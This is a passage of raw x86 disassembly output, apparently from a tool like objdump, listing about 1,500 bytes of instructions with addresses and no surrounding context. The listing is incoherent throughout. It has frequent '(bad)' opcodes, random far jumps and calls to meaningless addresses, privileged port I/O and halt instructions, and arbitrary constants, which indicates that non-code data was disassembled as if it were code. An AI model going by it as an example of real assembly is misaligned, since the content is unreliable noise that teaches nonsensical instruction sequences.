  4082d1:	xchg   esp,eax
  4082d2:	push   cs
  4082d3:	xchg   ecx,eax
  4082d4:	adc    dh,BYTE PTR [ebp-0x29]
  4082d7:	xor    ah,BYTE PTR [edi+edi*1]
  4082da:	pop    edi
  4082db:	xchg   BYTE PTR [edi],ah
  4082dd:	outs   dx,BYTE PTR ds:[esi]
  4082de:	mov    dl,0x72
  4082e0:	sub    BYTE PTR [edx-0x6493e772],dl
  4082e6:	and    ebp,DWORD PTR [ebx+0x51ed559e]
  4082ec:	push   0x2cf4aec8
  4082f1:	out    dx,eax
  4082f2:	adc    BYTE PTR [edi],al
  4082f4:	inc    eax
  4082f5:	jae    0x4082fc
  4082f7:	dec    esp
  4082f8:	loop   0x4082c7
  4082fa:	pop    ss
  4082fb:	xchg   esi,eax
  4082fc:	or     eax,0xa11b928d
  408301:	sysenter 
  408303:	xchg   edi,eax
  408304:	ret    0xdbc5
  408307:	sar    BYTE PTR [ebx+esi*4],1
  40830a:	xchg   esp,eax
  40830b:	clc    
  40830c:	pushf  
  40830d:	addr16 data16 std 
  408310:	pushf  
  408311:	mov    edx,0x20544f88
  408316:	fisttp QWORD PTR gs:[esi-0xa]
  40831a:	adc    eax,0xb0d848c4
  40831f:	and    dl,BYTE PTR [esi+eiz*1-0x687d2f5d]
  408326:	xchg   DWORD PTR [esi+0x25b5057],edx
  40832c:	pop    ss
  40832d:	inc    ebp
  40832e:	test   BYTE PTR [eax-0x4a],ah
  408331:	add    edi,ebx
  408333:	outs   dx,BYTE PTR ds:[esi]
  408334:	sbb    BYTE PTR [eax+0x66],ch
  408337:	ror    DWORD PTR [eax+0x6b2532ab],cl
  40833d:	scas   ax,WORD PTR es:[edi]
  40833f:	popf   
  408340:	adc    dl,BYTE PTR [edi-0x68]
  408343:	not    DWORD PTR ds:0xca6c08f4
  408349:	mov    WORD PTR [esp+edx*2],cs
  40834c:	sub    bh,BYTE PTR [esi-0x5829f5f5]
  408352:	ret    
  408353:	sbb    BYTE PTR [edi+0x4d57c6c7],0x51
  40835a:	sbb    eax,0x5e8b7ef
  40835f:	fnstenv [esi+0x12]
  408362:	sub    DWORD PTR [ebp-0x4c30bf04],0x56d70140
  40836c:	or     eax,DWORD PTR [ebp+0x7d558868]
  408372:	out    dx,eax
  408373:	je     0x408359
  408375:	dec    esp
  408376:	mov    bl,0x5b
  408378:	ret    
  408379:	dec    esp
  40837a:	sbb    BYTE PTR [ebp-0x31110450],cl
  408380:	or     eax,0x2c06994d
  408385:	mov    ecx,0x50a5bd3
  40838a:	lods   eax,DWORD PTR ds:[esi]
  40838b:	mov    ch,0x65
  40838d:	sbb    BYTE PTR [edi],dh
  40838f:	xlat   BYTE PTR ds:[ebx]
  408390:	cmp    BYTE PTR [ebx+eax*1-0x56ec7fd6],al
  408397:	das    
  408398:	inc    esp
  408399:	mov    ds:0xa9bd960e,eax
  40839e:	fimul  DWORD PTR [edi-0x5d]
  4083a1:	push   es
  4083a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083a3:	repz xor ch,BYTE PTR [edi+eax*2+0x18a6bad]
  4083ab:	les    edi,FWORD PTR [edx]
  4083ad:	sub    BYTE PTR [esi],al
  4083af:	push   cs
  4083b0:	push   ecx
  4083b1:	call   FWORD PTR [ebx+0x6f]
  4083b4:	jo     0x40837d
  4083b6:	fisubr WORD PTR [bx+di+0x17]
  4083ba:	pop    ebp
  4083bb:	fbstp  TBYTE PTR [esi+0x17ede985]
  4083c1:	jmp    0x3527:0xcfd1f08
  4083c8:	mov    edi,0x7c371fcc
  4083cd:	push   ss
  4083ce:	outs   dx,DWORD PTR ds:[esi]
  4083cf:	call   0x32fd:0xfd65934f
  4083d6:	add    BYTE PTR [edi+0x16381735],0xf1
  4083dd:	jg     0x408456
  4083df:	jg     0x408381
  4083e1:	enter  0xa70,0x70
  4083e5:	and    ebx,DWORD PTR [edx-0x2c]
  4083e8:	sbb    al,0x42
  4083ea:	sub    ch,BYTE PTR [ebx]
  4083ec:	xchg   DWORD PTR [ecx+0x62],edi
  4083ef:	ja     0x4083d9
  4083f1:	xchg   ebx,eax
  4083f2:	popa   
  4083f3:	pop    edi
  4083f4:	punpckldq mm1,DWORD PTR ds:0xe8037f93
  4083fb:	mov    ecx,DWORD PTR [eax+0x269ed9bd]
  408401:	dec    edx
  408402:	mov    edi,0xf60b4674
  408407:	(bad)  
  408408:	sbb    al,0x42
  40840a:	jo     0x4083d9
  40840c:	ret    0x7154
  40840f:	outs   dx,BYTE PTR ds:[esi]
  408410:	data16 loope 0x4083bb
  408413:	retf   
  408414:	dec    ebp
  408415:	and    esp,edx
  408417:	sbb    BYTE PTR [eax+eiz*4],al
  40841a:	sub    al,0x55
  40841c:	(bad)  
  40841d:	mov    WORD PTR [ecx+0x4e],cs
  408420:	mov    edx,0x846d82f7
  408425:	repnz lds ebx,FWORD PTR [edi]
  408428:	mov    ch,0x83
  40842a:	pop    esp
  40842b:	lea    esp,[edi+0x77eec975]
  408431:	and    al,0x31
  408433:	cmp    DWORD PTR [eax-0x23],edi
  408436:	or     BYTE PTR [ecx+esi*4],0x1
  40843a:	or     ah,BYTE PTR [edi-0x7763498d]
  408440:	sbb    DWORD PTR [ecx-0x5d],esi
  408443:	fiadd  WORD PTR [edx+0x62]
  408446:	pop    edx
  408447:	pop    esp
  408449:	push   ecx
  40844a:	adc    BYTE PTR [ebp-0x50],bh
  40844d:	and    ecx,DWORD PTR [eax]
  40844f:	sbb    BYTE PTR [edx+0x6d],al
  408452:	mov    edi,ebx
  408454:	adc    cl,BYTE PTR [esi+edx*4+0x12]
  408458:	loopne 0x408485
  40845a:	cmp    dl,bh
  40845c:	add    ah,bh
  40845e:	push   0xffffffed
  408460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408461:	mov    ds:0x306d123f,al
  408466:	pop    edi
  408467:	das    
  408468:	sbb    cl,0xc5
  40846b:	addr16 fs out 0xc4,al
  40846f:	mov    ebp,0x6d1497f0
  408474:	(bad)  
  408475:	jno    0x408485
  408477:	clc    
  408478:	cdq    
  408479:	rol    DWORD PTR [edx-0x62966582],1
  40847f:	push   edi
  408480:	imul   esi,esp,0xffffffc2
  408483:	xchg   edi,eax
  408484:	inc    ebp
  408485:	cmp    ebp,DWORD PTR [ebx+0x6841cbd3]
  40848b:	adc    eax,0x5d0b442a
  408490:	pusha  
  408491:	cdq    
  408492:	aaa    
  408493:	loope  0x40850b
  408495:	xor    eax,0xdc2e98f9
  40849a:	leave  
  40849b:	jecxz  0x408506
  40849d:	xchg   esp,eax
  40849e:	adc    ah,BYTE PTR [ebx-0x13ced0c8]
  4084a4:	shr    DWORD PTR es:[edi+0x5d],cl
  4084a8:	dec    ebx
  4084a9:	inc    ebx
  4084aa:	sti    
  4084ab:	ret    0xda86
  4084ae:	jg     0x4084b3
  4084b0:	in     al,dx
  4084b1:	mov    dl,0x4e
  4084b3:	mov    eax,ds:0xafebdd16
  4084b8:	dec    esp
  4084b9:	loop   0x40847e
  4084bb:	xchg   edx,eax
  4084bc:	pop    ebp
  4084bd:	jmp    0x4084b9
  4084bf:	test   eax,0x4d6ccce5
  4084c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084c5:	aas    
  4084c6:	sbb    BYTE PTR [edx-0x12],dl
  4084c9:	fcom   QWORD PTR [edi]
  4084cb:	jbe    0x4084d8
  4084cd:	and    eax,0x4ecf03e4
  4084d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084d3:	retf   0x543c
  4084d6:	shl    dl,0x5a
  4084d9:	pushf  
  4084da:	rol    BYTE PTR [edx+0x639920ab],cl
  4084e0:	in     eax,dx
  4084e1:	aad    0x99
  4084e3:	shr    DWORD PTR [edx+esi*1+0x6142b1af],0xbe
  4084eb:	xchg   esp,eax
  4084ec:	imul   esi,DWORD PTR [ecx+0x7ab4000e],0xffffffb6
  4084f3:	inc    ebp
  4084f4:	into   
  4084f5:	xor    eax,0xd2705d2d
  4084fa:	sub    DWORD PTR [esi-0x3d],esp
  4084fd:	mov    ds:0x10208863,eax
  408502:	xlat   BYTE PTR ds:[ebx]
  408503:	push   es
  408504:	je     0x40857e
  408506:	sub    eax,0xa76aea12
  40850b:	pop    ebx
  40850c:	xor    al,0xdb
  40850e:	adc    BYTE PTR [edi-0x2c],bh
  408511:	dec    ecx
  408512:	outs   dx,BYTE PTR ds:[esi]
  408513:	inc    edx
  408514:	jle    0x4084a4
  408516:	adc    BYTE PTR [edx-0x1],dl
  408519:	fxch   st(3)
  40851b:	loop   0x4084c6
  40851d:	es (bad) 
  40851f:	or     eax,0xa0e5efec
  408524:	(bad)  
  408525:	popa   
  408526:	or     al,0x68
  408528:	repz and al,0xa7
  40852b:	addr16 add cl,0xed
  40852f:	push   esp
  408530:	sub    BYTE PTR [ebx],dl
  408532:	xchg   esi,eax
  408533:	cdq    
  408534:	loop   0x40851a
  408536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408537:	dec    DWORD PTR ds:0x6b910ce4
  40853d:	test   al,0x5a
  40853f:	stos   BYTE PTR es:[di],al
  408541:	xor    ecx,ecx
  408543:	and    DWORD PTR [eax-0x779ae776],eax
  408549:	add    dh,BYTE PTR [ecx]
  40854b:	push   esi
  40854c:	and    ch,bh
  40854e:	add    edi,DWORD PTR [edx]
  408550:	push   ecx
  408551:	dec    ecx
  408552:	(bad)  [eax-0x10cbca3e]
  408558:	and    bh,dl
  40855a:	fimul  WORD PTR ss:[edx+0x7d]
  40855e:	push   0xed44e1ba
  408563:	xor    esi,DWORD PTR ds:0x45965338
  408569:	dec    cx
  40856b:	les    ebx,FWORD PTR [ecx]
  40856d:	pop    eax
  40856e:	daa    
  40856f:	idiv   DWORD PTR [eax-0x13d34b6a]
  408575:	bound  ebx,QWORD PTR [eax+0xb]
  408578:	sub    eax,DWORD PTR ds:[esi-0x7e597585]
  40857f:	push   eax
  408580:	xor    eax,0xf0eff41b
  408585:	pop    es
  408586:	popf   
  408587:	mov    al,ds:0x8dcfac14
  40858c:	mov    bl,0x5f
  40858e:	mov    edx,0x6b3419a9
  408593:	loop   0x408517
  408595:	mov    dh,0xf7
  408597:	sar    BYTE PTR [edx-0x6e],cl
  40859a:	cld    
  40859b:	(bad)  
  40859d:	cmp    al,0x5
  40859f:	(bad)  
  4085a0:	push   eax
  4085a1:	dec    ebx
  4085a2:	bound  eax,QWORD PTR [ecx-0x735fa8e1]
  4085a8:	cmp    al,0x20
  4085aa:	cmp    bl,cl
  4085ac:	jbe    0x408562
  4085ae:	jp     0x4085c9
  4085b0:	outs   dx,DWORD PTR ds:[esi]
  4085b1:	and    BYTE PTR [ebp+0x22682972],dl
  4085b7:	sbb    edx,ebp
  4085b9:	add    ebx,eax
  4085bb:	sbb    al,0x59
  4085bd:	add    DWORD PTR [ebp-0x204ffbd5],eax
  4085c3:	mov    ecx,DWORD PTR [ecx]
  4085c5:	mov    ebp,0x86ff9ac4
  4085ca:	inc    ebp
  4085cb:	clc    
  4085cc:	test   esp,0x3d47fde8
  4085d2:	lods   eax,DWORD PTR ds:[esi]
  4085d3:	mov    DWORD PTR [ebx],ecx
  4085d5:	loop   0x4085cb
  4085d7:	stos   BYTE PTR es:[edi],al
  4085d8:	mov    ds:0x67837df,eax
  4085dd:	jl     0x408625
  4085df:	pop    DWORD PTR [eax-0x42]
  4085e2:	js     0x4085d4
  4085e4:	inc    ebp
  4085e5:	adc    BYTE PTR [ebp+0x26],bh
  4085e8:	loop   0x408610
  4085ea:	adc    al,0x93
  4085ec:	jmp    0x4085b7
  4085ee:	or     al,0x5f
  4085f0:	cmp    bl,BYTE PTR [ecx]
  4085f2:	ins    BYTE PTR es:[edi],dx
  4085f3:	lods   al,BYTE PTR ds:[esi]
  4085f4:	cwde   
  4085f5:	ja     0x408587
  4085f7:	cmp    al,ah
  4085f9:	std    
  4085fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085fb:	les    esp,FWORD PTR [esi-0x3a]
  4085fe:	xchg   ecx,eax
  4085ff:	push   0xffffffed
  408601:	add    ebx,ebx
  408603:	push   ebp
  408604:	jbe    0x408659
  408606:	scas   al,BYTE PTR es:[edi]
  408607:	lods   eax,DWORD PTR ds:[esi]
  408608:	jno    0x40865b
  40860a:	jge    0x408650
  40860c:	ja     0x408593
  40860e:	jno    0x40865c
  408610:	jbe    0x408679
  408612:	mov    ch,0x91
  408614:	mov    ds:0x483f17e9,eax
  408619:	xchg   ebp,eax
  40861a:	or     BYTE PTR [edi-0x3a81d6cb],0x68
  408621:	mov    edi,ecx
  408623:	fsub   DWORD PTR [eax]
  408625:	lock inc esp
  408627:	xchg   DWORD PTR [edx+ecx*4+0x7378cdd9],eax
  40862e:	jg     0x4085e8
  408630:	aas    
  408631:	jge    0x40862b
  408633:	bound  esi,QWORD PTR [edx-0x30f206a9]
  408639:	pop    ss
  40863a:	loop   0x4086a2
  40863c:	pusha  
  40863d:	cld    
  40863e:	and    DWORD PTR [edi],esi
  408640:	enter  0x66c1,0xa4
  408644:	(bad)  
  408645:	sub    al,0x64
  408647:	out    dx,eax
  408648:	sbb    ch,BYTE PTR [eax]
  40864a:	loopne 0x408676
  40864c:	jo     0x408648
  40864e:	pop    ebp
  40864f:	fdivr  DWORD PTR [esi+0x455544e9]
  408655:	adc    DWORD PTR [ebp+0x34c17f4f],ecx
  40865b:	sub    BYTE PTR [ecx+0x1],al
  40865e:	aam    0x31
  408660:	mov    esp,0x913d87c2
  408665:	sbb    ch,BYTE PTR [eax-0x7e9dddcc]
  40866b:	cdq    
  40866c:	stos   BYTE PTR es:[edi],al
  40866d:	call   0x121d:0x5456561f
  408674:	ja     0x408686
  408676:	pop    ecx
  408678:	mov    al,0x95
  40867a:	test   al,0xb
  40867c:	push   esi
  40867d:	stos   BYTE PTR es:[edi],al
  40867e:	nop
  40867f:	cmc    
  408680:	and    eax,0xa4a7cf60
  408685:	neg    edx
  408687:	faddp  st(1),st
  408689:	push   eax
  40868a:	clc    
  40868b:	pop    esi
  40868c:	jo     0x408686
  40868e:	push   ebp
  40868f:	and    ebp,DWORD PTR [edi-0x3bf1b968]
  408695:	pop    ebp
  408696:	out    0x3f,al
  408698:	pop    ebp
  408699:	add    ebp,edx
  40869b:	adc    esp,ebp
  40869d:	add    bl,BYTE PTR [eax]
  40869f:	inc    edx
  4086a0:	sbb    DWORD PTR [eax-0x910354b],edi
  4086a6:	and    eax,0x3d99ff2b
  4086ab:	mov    eax,0x5c353eba
  4086b0:	adc    edi,DWORD PTR [esi+0x687d4d8a]
  4086b6:	push   esp
  4086b7:	jmp    0x3c1df413
  4086bc:	repz ja 0x408687
  4086bf:	add    ebx,DWORD PTR [ecx+0x6e]
  4086c2:	jo     0x4086c7
  4086c4:	stos   DWORD PTR es:[edi],eax
  4086c5:	js     0x40871b
  4086c7:	out    dx,eax
  4086c8:	data16 mov bh,0x33
  4086cb:	adc    al,0x29
  4086cd:	and    DWORD PTR [eax+0x16],ecx
  4086d0:	dec    ebx
  4086d1:	mov    ss,WORD PTR [ecx-0x34]
  4086d4:	fnstsw WORD PTR [esi-0x46]
  4086d7:	sbb    DWORD PTR [edi],edi
  4086d9:	ss bound ecx,QWORD PTR fs:[eax+0x4a8169bf]
  4086e1:	aad    0x60
  4086e3:	or     bh,dl
  4086e5:	gs retf 
  4086e7:	push   edi
  4086e8:	call   0x1704db9b
  4086ed:	retf   
  4086ee:	xor    esi,DWORD PTR [ebp+0x6e]
  4086f1:	xchg   edi,eax
  4086f2:	pop    ebx
  4086f3:	test   eax,0x1475faf0
  4086f8:	test   eax,0x98b25f9e
  4086fd:	xor    eax,0x503ba1bf
  408702:	fldcw  WORD PTR [ebp-0x2a]
  408705:	stc    
  408706:	cdq    
  408707:	test   BYTE PTR [ebx+esi*2-0x337c1d7c],0x3e
  40870f:	pop    es
  408710:	mov    BYTE PTR [edi+0x2b257fb3],ch
  408716:	xchg   DWORD PTR [ebx-0x1d],ecx
  408719:	mov    ebx,DWORD PTR [ebx-0x5f]
  40871c:	xchg   edi,eax
  40871d:	jmp    0xdf5b:0x6c65445f
  408724:	hlt    
  408725:	mov    eax,0x1f268cc5
  40872a:	or     ch,BYTE PTR [ebx-0x20eb972d]
  408730:	js     0x4086fe
  408732:	xor    ecx,DWORD PTR [esp+ecx*8-0x19]
  408736:	les    edx,FWORD PTR [ebx-0x46]
  408739:	mov    dl,0xd9
  40873b:	mov    eax,ds:0x94a75038
  408740:	aad    0xe9
  408742:	retf   0xfb55
  408745:	(bad)  
  408747:	or     al,0x65
  408749:	int    0x3d
  40874b:	xor    al,0xdd
  40874d:	and    BYTE PTR es:[ecx+ecx*1+0x175bd38d],bh
  408755:	aad    0x9
  408757:	cdq    
  408758:	jnp    0x4086f1
  40875a:	push   esi
  40875b:	inc    esi
  40875c:	xchg   edx,eax
  40875d:	and    DWORD PTR [ebp-0xd],ebp
  408760:	cwde   
  408761:	ret    0x59ce
  408764:	dec    eax
  408765:	jb     0x408725
  408767:	into   
  408768:	hlt    
  408769:	test   al,0x63
  40876b:	add    ah,BYTE PTR [eax+0x57095378]
  408771:	push   edi
  408772:	jns    0x4087dd
  408774:	adc    eax,0x779bafc1
  408779:	mov    eax,ds:0xb378c806
  40877e:	ret    
  40877f:	ret    
  408780:	xlat   BYTE PTR ds:[ebx]
  408781:	aas    
  408782:	pop    ebp
  408783:	push   cs
  408784:	mov    esp,0x739c1aa5
  408789:	stc    
  40878a:	xor    dh,BYTE PTR [eax+0x70]
  40878d:	adc    dl,dl
  40878f:	(bad)  
  408790:	fisubr DWORD PTR [edx-0x675d3c8c]
  408796:	jl     0x4087b8
  408798:	pop    esi
  408799:	add    ah,dl
  40879b:	jnp    0x4087ba
  40879d:	inc    esp
  40879e:	add    dl,BYTE PTR [esi]
  4087a0:	in     eax,dx
  4087a1:	lea    ecx,[esp+edx*2-0xf3f0d9a]
  4087a8:	retf   
  4087a9:	inc    edx
  4087aa:	(bad)  
  4087ac:	xor    DWORD PTR [esi+ecx*2-0x2256eb11],edx
  4087b3:	mov    al,0x42
  4087b5:	rcr    DWORD PTR [ebx+0x66],0x7d
  4087b9:	dec    dl
  4087bb:	test   eax,0xa72393f2
  4087c0:	popf   
  4087c1:	mov    ds:0x127d8750,al
  4087c6:	shr    BYTE PTR [edx],1
  4087c8:	in     al,0x88
  4087ca:	out    0xd,al
  4087cc:	xchg   ebp,eax
  4087cd:	int    0xe3
  4087cf:	and    esp,edx
  4087d1:	mul    BYTE PTR [ebx+0x41b87a9d]
  4087d7:	lds    esi,FWORD PTR [edi-0x70450027]
  4087dd:	sub    cl,BYTE PTR [edi-0x71]
  4087e0:	rol    ch,cl
  4087e2:	(bad)  
  4087e3:	retf   0x10b2
  4087e6:	cmp    bh,dl
  4087e8:	fisubr DWORD PTR [eax-0x67]
  4087eb:	mov    al,ds:0x10a3cce1
  4087f0:	out    dx,al
  4087f1:	scas   ax,WORD PTR es:[edi]
  4087f3:	repnz add ch,dh
  4087f6:	loope  0x40886c
  4087f8:	imul   ebx,DWORD PTR [ebp-0x420e5594],0x43
  4087ff:	(bad)  
  408800:	jae    0x4087fc
  408802:	sub    DWORD PTR [ebx],ebx
  408804:	mov    ch,0x75
  408806:	inc    eax
  408807:	fdivr  QWORD PTR [esp+ebx*8+0x7d053442]
  40880e:	stos   BYTE PTR es:[edi],al
  40880f:	fsubr  DWORD PTR [esi-0x38]
  408812:	dec    edi
  408813:	add    esi,0x70a3bc2c
  408819:	retf   0x52c3
  40881c:	xchg   BYTE PTR [esi+ecx*8-0x53],dl
  408820:	into   
  408821:	out    0x30,al
  408823:	aas    
  408824:	ret    0x1d8d
  408827:	retf   0x4e75
  40882a:	test   DWORD PTR [ebp-0x28],ecx
  40882d:	inc    edi
  40882e:	sbb    DWORD PTR [edx+0x194131f2],edx
  408834:	push   esp
  408835:	mov    ds:0xd262d062,eax
  40883a:	inc    eax
  40883b:	int    0x84
  40883d:	cli    
  40883e:	fnstenv [esi]
  408840:	mov    ch,0xa
  408842:	lds    edi,FWORD PTR [esi]
  408844:	jmp    0xdeb1:0x68a90997
  40884b:	mov    dh,BYTE PTR [esi-0x33]
  40884e:	xor    bl,ah
  408850:	mov    WORD PTR [edi+0x7d],fs
  408853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408854:	sub    ah,BYTE PTR [edi+0x48]
  408857:	enter  0xa7be,0x74
  40885b:	or     DWORD PTR [esi+0x468be567],eax
  408861:	pop    es
  408862:	in     al,0xab
  408864:	test   BYTE PTR [ebp+0x28],0xff
  408868:	pop    ebp
  408869:	pop    ebp
  40886a:	lock sbb BYTE PTR [esi-0x5c95b886],al
  408871:	sbb    bh,BYTE PTR [esi+0x71]
  408874:	lahf   
  408875:	iret   
  408876:	jno    0x4088ae
  408878:	loopne 0x4088d6
  40887a:	jp     0x40883c
  40887c:	cmp    ebx,ebp
  40887e:	fidiv  WORD PTR [ebp-0x5046585e]
  408884:	loop   0x4088fd
  408886:	sbb    bl,BYTE PTR [eax+0x5510438f]
  40888c:	mov    WORD PTR [edx+edx*4+0x343601df],cs
  408893:	mov    DWORD PTR [eax-0x31688b47],eax
  408899:	ficomp WORD PTR [esi+0x2008826d]
  40889f:	xor    DWORD PTR [ebx],0xffffffd8
  4088a2:	jne    0x40884c
  4088a4:	fnstcw WORD PTR [ebp-0x5]
  4088a7:	(bad)  
  4088a8:	loop   0x40884b
  4088aa:	mov    ecx,DWORD PTR [ecx-0xa3a52b8]
  4088b0:	mov    edi,0xf9dd9c99
  4088b5:	retf   
  4088b6:	js     0x40888b
  4088b8:	iret   
  4088b9:	loopne 0x408897
  4088bb:	pop    ecx
  4088bc:	repz pop ds
  4088be:	out    0x85,al
  4088c0:	ja     0x408912
  4088c2:	mov    BYTE PTR [esi-0x18],cl
  4088c5:	mov    esp,0xa5e4c2b5
  4088ca:	cmp    DWORD PTR [edi],ecx
  4088cc:	sbb    DWORD PTR [edi+0x4],ecx
  4088cf:	push   ecx
  4088d0:	sahf   
  4088d1:	inc    ecx
  4088d2:	pop    ebp
  4088d3:	push   0xffffffc7
  4088d5:	cmp    BYTE PTR [esi-0x7b868a0e],bl
  4088db:	jo     0x408866
  4088dd:	out    0xd9,eax
  4088df:	add    DWORD PTR [esi+0x7709f824],ebx
  4088e5:	out    0xde,eax
  4088e7:	into   
  4088e8:	in     al,0xcd
  4088ea:	jae    0x40891b
  4088ec:	and    eax,0xd4aae0ab
  4088f1:	inc    esi
  4088f2:	mov    es:0xb0489104,eax
  4088f8:	push   ecx
  4088f9:	inc    ebp
  4088fa:	out    dx,eax
  4088fb:	xchg   dh,bh
  4088fd:	or     al,0x66
  4088ff:	or     eax,0x1faab66
  408904:	and    ebp,ebx
  408906:	sbb    eax,0xbe03c787
  40890b:	sbb    DWORD PTR [ebp-0x1],edx
  40890e:	ss jne 0x4088ae
  408911:	jmp    0x6be91a85
  408916:	popa   
  408917:	aas    
  408918:	pop    edi
  408919:	in     al,0x8
  40891b:	sbb    ecx,ecx
  40891d:	ror    DWORD PTR ds:0xd17e099,0x74
  408924:	inc    ebx
  408925:	mov    al,ds:0x37a49377
  40892a:	sub    eax,0x3d313f16
  40892f:	ins    DWORD PTR es:[edi],dx
  408930:	push   ds
  408931:	retf   0x477b
  408934:	add    al,0x8b
  408936:	and    al,0xa1
  408938:	fimul  DWORD PTR [eax+0x57298f54]
  40893e:	shl    DWORD PTR [ebx-0xa9b3d94],0x50
  408945:	rcr    BYTE PTR [eax],1
  408947:	mov    bh,BYTE PTR [esi+0x1282aacf]
  40894d:	call   0xcfdd170b
  408952:	push   edi
  408953:	xor    esi,DWORD PTR [edi]
  408955:	pop    ecx
  408956:	out    dx,al
  408957:	aad    0x49
  408959:	aaa    
  40895a:	cld    
  40895b:	and    al,0xa8
  40895d:	xchg   ecx,eax
  40895e:	stos   BYTE PTR es:[edi],al
  40895f:	mov    dh,al
  408961:	fistp  DWORD PTR [ecx+0x230cb553]
  408967:	stc    
  408968:	loop   0x408964
  40896a:	out    dx,eax
  40896b:	lods   eax,DWORD PTR ds:[esi]
  40896c:	std    
  40896d:	inc    esp
  40896e:	loopne 0x40891b
  408970:	pop    esp
  408971:	repnz sbb dh,BYTE PTR [ebx]
  408974:	xchg   esi,eax
  408975:	add    al,BYTE PTR [ecx+0x56]
  408978:	dec    edx
  408979:	enter  0x72f0,0xb2
  40897d:	or     DWORD PTR [ebp+0x1b],edx
  408980:	sbb    DWORD PTR [edx],0xa49cf8ca
  408986:	sub    dh,ch
  408988:	dec    ecx
  408989:	imul   esp,DWORD PTR [ebx+0x3434530e],0x566959ba
  408993:	out    0x1e,eax
  408995:	dec    esp
  408996:	sbb    BYTE PTR [eax+0x22b0d0ed],ch
  40899c:	add    DWORD PTR [eax],ebp
  40899e:	push   ds
  40899f:	sbb    al,0xa
  4089a1:	popf   
  4089a2:	imul   esi,DWORD PTR [ebp-0x5d50539c],0x7b
  4089a9:	leave  
  4089aa:	sahf   
  4089ab:	inc    edi
  4089ac:	jo     0x408972
  4089ae:	adc    edi,DWORD PTR [ebp-0x30]
  4089b1:	hlt    
  4089b2:	je     0x40898f
  4089b4:	mov    es,WORD PTR [ecx+0x7c16ba24]
  4089ba:	das    
  4089bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089bc:	or     al,0x32
  4089be:	xchg   BYTE PTR [ecx],cl
  4089c0:	mov    eax,0x722af634
  4089c5:	fsubr  st,st(3)
  4089c7:	(bad)
  4089cb:	sbb    eax,0x344835e0
  4089d0:	nop
  4089d1:	retf   
  4089d2:	loopne 0x40895d
  4089d4:	push   cs
  4089d5:	and    al,0x66
  4089d7:	adc    esp,esi
  4089d9:	dec    esp
  4089da:	mov    esi,0xd63db89f
  4089df:	add    eax,DWORD PTR [ebp-0x36]
  4089e2:	add    eax,0xfb8e450f
  4089e7:	aam    0x56
  4089e9:	add    ecx,DWORD PTR [eax+0x7e38efa2]
  4089ef:	test   eax,0x8b6c42c5
  4089f4:	sbb    BYTE PTR [edx],0xb1
  4089f7:	mov    WORD PTR [eax+edi*1+0x5f],cs
  4089fb:	push   ebp
  4089fc:	jmp    0xbe12:0x832c9552
  408a03:	std    
  408a04:	xchg   esi,eax
  408a05:	repz cdq 
  408a07:	fild   WORD PTR [edi]
  408a09:	xor    ebp,DWORD PTR [esi-0x27784c89]
  408a0f:	xor    eax,DWORD PTR [edi+0x380451da]
  408a15:	popa   
  408a16:	fwait
  408a17:	pop    eax
  408a18:	inc    ebp
  408a19:	call   0x8c5dbbd7
  408a1e:	lea    ebx,[eax+edi*8-0x6b]
  408a22:	jne    0x408a1a
  408a24:	ins    DWORD PTR es:[edi],dx
  408a25:	or     edi,DWORD PTR [edx+esi*1+0x15e0cb18]
  408a2c:	sub    ecx,DWORD PTR [edx+0x5841a89b]
  408a32:	lds    ebx,FWORD PTR [esi]
  408a34:	inc    eax
  408a35:	call   0x6e4a47f
  408a3a:	shl    DWORD PTR [ebp+0x54],0x7e
  408a3e:	ins    BYTE PTR es:[edi],dx
  408a3f:	cs push es
  408a41:	daa    
  408a42:	xor    DWORD PTR [ebp-0x12],0x19
  408a46:	bound  ebp,QWORD PTR [eax+0x6856b351]
  408a4c:	(bad)  
  408a4d:	idiv   dl
  408a4f:	xchg   esi,eax
  408a50:	xchg   ebx,eax
  408a51:	sub    dl,cl
  408a53:	ins    DWORD PTR es:[edi],dx
  408a54:	cmp    eax,0xcdecc88
  408a59:	jmp    0xd4e9d1ff
  408a5e:	sbb    esp,DWORD PTR [edx+0x7cd47307]
  408a64:	popf   
  408a65:	jno    0x408a12
  408a67:	inc    edi
  408a68:	jmp    0xb2833361
  408a6d:	jb     0x408ac6
  408a6f:	hlt    
  408a70:	(bad)  
  408a72:	mov    eax,ds:0x2f5262aa
  408a77:	cmc    
  408a78:	nop
  408a79:	pop    esi
  408a7a:	mov    dl,0x9f
  408a7c:	lahf   
  408a7d:	ret    0x4f41
  408a80:	les    edx,FWORD PTR [eax-0x6a]
  408a83:	push   esi
  408a84:	(bad)  
  408a85:	in     al,dx
  408a86:	mov    ecx,0x8481649d
  408a8b:	adc    dh,BYTE PTR [edi]
  408a8d:	jmp    DWORD PTR [edi]
  408a8f:	fisttp DWORD PTR [edi]
  408a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a92:	test   al,0x39
  408a94:	(bad)  
  408a95:	push   ds
  408a96:	pop    eax
  408a97:	dec    edx
  408a98:	in     eax,0x55
  408a9a:	neg    esi
  408a9c:	mov    dh,0x5
  408a9e:	daa    
  408a9f:	inc    edi
  408aa0:	imul   BYTE PTR [edx-0x29]
  408aa3:	call   esi
  408aa5:	xchg   BYTE PTR [ebp+0x4],al
  408aa8:	outs   dx,BYTE PTR ds:[esi]
  408aa9:	mov    ds:0x12571c02,eax
  408aae:	cmp    dh,BYTE PTR [ebx+0x52f72b22]
  408ab4:	aad    0xbc
  408ab6:	imul   esp,DWORD PTR [edx+eax*8+0x3d],0xffffffc6
  408abb:	xchg   esp,eax
  408abc:	adc    al,0x15
  408abe:	mov    esp,0x950cd8d5
  408ac3:	bound  ecx,QWORD PTR [edi-0x1b230f37]
  408ac9:	addr16 push ss
  408acb:	add    ecx,DWORD PTR [ebx+edi*8-0x60]
  408acf:	pop    ebx
  408ad0:	loope  0x408ad1
  408ad2:	dec    esi
  408ad3:	inc    esi
  408ad4:	iret   
  408ad5:	outs   dx,BYTE PTR ds:[esi]
  408ad6:	jne    0x408aeb
  408ad8:	(bad)  
  408ad9:	cmp    ah,bh
  408adb:	hlt    
  408adc:	sub    ch,dl
  408ade:	and    BYTE PTR [ecx],0x51
